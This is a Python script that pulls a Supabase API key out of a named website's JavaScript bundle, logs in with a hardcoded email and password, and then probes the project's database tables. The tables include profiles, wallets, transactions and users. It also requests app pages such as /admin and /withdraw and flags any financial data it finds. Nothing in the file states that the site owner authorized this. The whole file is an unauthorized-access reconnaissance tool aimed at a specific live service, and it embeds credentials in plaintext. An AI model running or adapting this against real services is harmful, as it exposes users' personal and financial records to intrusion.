#!/usr/bin/env python3
"""Explore TaskKita dashboard with authenticated session."""
import urllib.request, json, re, http.cookiejar

SUPABASE_URL = "https://xvdibouzxfynsxgrmffb.supabase.co"
EMAIL = "taskkita.test.7788@web-library.net"
PASSWORD = "TestPass789!"
SUPABASE_KEY = ""  # Will be extracted

# Get supabase key from JS
req = urllib.request.Request("https://taskkita.com/assets/index-CdJ2nOzM.js",
    headers={"User-Agent": "Mozilla/5.0"})
resp = urllib.request.urlopen(req, timeout=15)
data = resp.read().decode(errors="replace")
keys = re.findall(r'["\'](eyJ[a-zA-Z0-9_-]+[.][a-zA-Z0-9_-]+[.][a-zA-Z0-9_-]+)["\']', data)
SUPABASE_KEY = keys[0] if keys else ""

# Login via Supabase REST API
import http.client, ssl
conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
payload = json.dumps({"email": EMAIL, "password": PASSWORD})
headers = {
    "Content-Type": "application/json",
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
}
conn.request("POST", "/auth/v1/token?grant_type=password", body=payload, headers=headers)
resp = conn.getresponse()
body = json.loads(resp.read().decode())
conn.close()

access_token = body.get("access_token", "")
refresh_token = body.get("refresh_token", "")
user_id = body.get("user", {}).get("id", "")
print(f"✅ LOGIN SUCCESS: {EMAIL}")
print(f"User ID: {user_id}")
print(f"Access Token: {access_token[:50]}...")

# Now explore authenticated pages
headers = {
    "User-Agent": "Mozilla/5.0",
    "Authorization": f"Bearer {access_token}",
    "apikey": SUPABASE_KEY,
}

# Check what RLS/authenticated endpoints exist on Supabase
# Try to query supabase for user data
print("\n=== QUERYING SUPABASE DATABASE ===")
endpoints = [
    ("/rest/v1/profiles", "profiles"),
    ("/rest/v1/wallets", "wallets"),
    ("/rest/v1/campaigns", "campaigns"),
    ("/rest/v1/orders", "orders"),
    ("/rest/v1/transactions", "transactions"),
    ("/rest/v1/users", "users"),
    ("/rest/v1/products", "products"),
    ("/rest/v1/services", "services"),
]

for path, name in endpoints:
    try:
        conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
        conn.request("GET", path, headers=headers)
        r = conn.getresponse()
        body = r.read().decode()
        if r.status == 200 and len(body) > 10:
            data = json.loads(body)
            print(f"\n  ✅ [{r.status}] {name}:")
            if isinstance(data, list):
                print(f"     Records: {len(data)}")
                if data:
                    print(f"     First: {json.dumps(data[0], indent=2)[:300]}")
            elif isinstance(data, dict):
                print(f"     Data: {json.dumps(data, indent=2)[:300]}")
        else:
            print(f"\n  ❌ [{r.status}] {name}: {body[:100]}")
        conn.close()
    except Exception as e:
        print(f"\n  ❌ {name}: {e}")

# Also explore the actual app pages with the session token
print("\n=== EXPLORING APP PAGES ===")
import http.cookiejar
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
opener.addheaders = [
    ("User-Agent", "Mozilla/5.0"),
    ("Cookie", f"sb-auth-token={access_token}"),
]

pages = ["/dashboard", "/wallet", "/withdraw", "/profile", "/campaigns", "/admin"]
for page in pages:
    try:
        req = urllib.request.Request(f"https://taskkita.com{page}")
        resp = opener.open(req, timeout=10)
        html = resp.read().decode(errors="replace")[:500]
        # Extract title
        title_m = re.search(r'<title>([^<]+)</title>', html)
        title = title_m.group(1) if title_m else "No title"
        # Check for sensitive data patterns
        data_patterns = re.findall(r'[0-9]+\.[0-9]{2}|RM[0-9]+|followers|balance|amount|wallet|email|@|username', html, re.IGNORECASE)
        print(f"\n  [{resp.status}] {page}: {title}")
        if data_patterns:
            print(f"     Contains financial data: {len(data_patterns)} matches")
        # Print first meaningful text
        texts = re.findall(r'>([^<]{10,})<', html)
        for t in texts[:3]:
            clean = re.sub(r'&[a-z]+;', ' ', t).strip()
            if clean:
                print(f"     {clean[:150]}")
    except Exception as e:
        print(f"\n  [{page}]: Error: {e}")
